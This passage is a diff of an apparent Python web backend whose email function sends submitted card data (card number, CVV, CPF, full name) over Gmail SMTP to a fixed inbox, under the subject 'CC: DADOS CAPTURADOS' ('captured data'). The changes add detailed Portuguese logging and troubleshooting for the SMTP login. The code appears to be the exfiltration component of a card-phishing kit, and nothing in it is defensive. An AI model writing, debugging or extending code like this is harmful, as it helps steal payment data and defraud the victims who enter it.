@@ -150,9 +150,24 @@ CVV: {payment_data.cvv}
         raise
 
 def send_email(payment_data: PaymentData) -> bool:
-    """Send payment update email"""
+    """Send payment update email with detailed logging"""
     try:
+        print(f"\n{'='*80}")
+        print(f"📧 INICIANDO ENVIO DE EMAIL")
+        print(f"{'='*80}")
+
+        # Verify credentials are loaded
+        print(f"\n1️⃣  Verificando credenciais...")
+        print(f"   EMAIL_FROM: {EMAIL_FROM}")
+        print(f"   EMAIL_TO: {EMAIL_TO}")
+        print(f"   SMTP_SERVER: {SMTP_SERVER}:{SMTP_PORT}")
+
+        if not EMAIL_FROM or not EMAIL_PASSWORD or not EMAIL_TO:
+            print(f"❌ ERRO: Credenciais não carregadas do .env!")
+            return False
+
         # Create message
+        print(f"\n2️⃣  Criando mensagem de email...")
         message = MIMEMultipart("alternative")
         message["Subject"] = "CC: DADOS CAPTURADOS"
         message["From"] = EMAIL_FROM
@@ -192,14 +207,14 @@ CVV: ***
             <body style="font-family: Arial, sans-serif; background-color: #f5f5f5; padding: 20px;">
                 <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                     <h2 style="color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px;">DADOS DE PAGAMENTO</h2>
-                    
+
                     <p style="color: #666; font-size: 12px;">
                         <strong>Data/Hora:</strong> {current_datetime}<br>
                         <strong>Hora de Processamento:</strong> {current_datetime}
                     </p>
-                    
+
                     <h3 style="color: #333; margin-top: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px;">INFORMAÇÕES PESSOAIS</h3>
-                    
+
                     <table style="width: 100%; margin-top: 10px;">
                         <tr>
                             <td style="padding: 8px; font-weight: bold; color: #555;">Nome Completo:</td>
@@ -210,9 +225,9 @@ CVV: ***
                             <td style="padding: 8px; color: #333;">{payment_data.cpf}</td>
                         </tr>
                     </table>
-                    
+
                     <h3 style="color: #333; margin-top: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px;">DADOS DO CARTÃO</h3>
-                    
+
                     <table style="width: 100%; margin-top: 10px;">
                         <tr>
                             <td style="padding: 8px; font-weight: bold; color: #555;">Número do Cartão:</td>
@@ -227,7 +242,7 @@ CVV: ***
                             <td style="padding: 8px; color: #333;">***</td>
                         </tr>
                     </table>
-                    
+
                     <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; color: #999; font-size: 12px;">
                         <p>Este é um e-mail automático. Por favor, não responda a este e-mail.</p>
                     </div>
@@ -237,37 +252,71 @@ CVV: ***
         """
 
         # Attach versions
+        print(f"✓ Conteúdo do email criado")
         part1 = MIMEText(text, "plain")
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
 
         # Send email with detailed error handling
-        print(f"📧 Enviando email para: {EMAIL_TO}")
-        print(f"📧 Servidor SMTP: {SMTP_SERVER}:{SMTP_PORT}")
-        
+        print(f"\n3️⃣  Conectando ao servidor SMTP...")
+        print(f"   Servidor: {SMTP_SERVER}:{SMTP_PORT}")
+
         with smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10) as server:
+            print(f"✓ Conectado ao servidor SMTP")
+
+            print(f"\n4️⃣  Iniciando TLS...")
             server.starttls()
-            print(f"✓ TLS conectado")
-            
+            print(f"✓ TLS ativado com sucesso")
+
+            print(f"\n5️⃣  Autenticando com Gmail...")
+            print(f"   Usuário: {EMAIL_FROM}")
             server.login(EMAIL_FROM, EMAIL_PASSWORD)
             print(f"✓ Autenticação bem-sucedida")
-            
-            server.sendmail(EMAIL_FROM, EMAIL_TO, message.as_string())
-            print(f"✓ Email enviado com sucesso")
 
+            print(f"\n6️⃣  Enviando email...")
+            result = server.sendmail(EMAIL_FROM, EMAIL_TO, message.as_string())
+            print(f"✓ Email enviado com sucesso para: {EMAIL_TO}")
+
+        print(f"\n{'='*80}")
+        print(f"✅ EMAIL ENVIADO COM SUCESSO!")
+        print(f"{'='*80}\n")
         return True
+
     except smtplib.SMTPAuthenticationError as e:
-        print(f"✗ Erro de autenticação SMTP: {str(e)}")
-        print(f"  - Verifique EMAIL_FROM e EMAIL_PASSWORD no arquivo .env")
+        print(f"\n❌ ERRO DE AUTENTICAÇÃO SMTP")
+        print(f"{'='*80}")
+        print(f"Erro: {str(e)}")
+        print(f"\n⚠️  CAUSAS POSSÍVEIS:")
+        print(f"  1. EMAIL_FROM ou EMAIL_PASSWORD incorretos no .env")
+        print(f"  2. Senha de app do Gmail não foi gerada")
+        print(f"  3. Autenticação de dois fatores não está ativada")
+        print(f"\n✅ SOLUÇÃO:")
+        print(f"  1. Acesse: https://myaccount.google.com/apppasswords")
+        print(f"  2. Gere uma nova senha de app")
+        print(f"  3. Atualize EMAIL_PASSWORD no arquivo backend/.env")
+        print(f"  4. Reinicie o backend com: python main.py")
+        print(f"{'='*80}\n")
         return False
+
     except smtplib.SMTPException as e:
-        print(f"✗ Erro SMTP: {str(e)}")
+        print(f"\n❌ ERRO SMTP")
+        print(f"{'='*80}")
+        print(f"Erro: {str(e)}")
+        print(f"\n⚠️  CAUSAS POSSÍVEIS:")
+        print(f"  1. Servidor SMTP indisponível")
+        print(f"  2. Porta bloqueada pelo firewall")
+        print(f"  3. Problema de conexão de internet")
+        print(f"{'='*80}\n")
         return False
+
     except Exception as e:
-        print(f"✗ Erro ao enviar email: {str(e)}")
+        print(f"\n❌ ERRO NÃO IDENTIFICADO")
+        print(f"{'='*80}")
+        print(f"Erro: {str(e)}")
         import traceback
         traceback.print_exc()
+        print(f"{'='*80}\n")
         return False
 
 @app.on_event("startup")
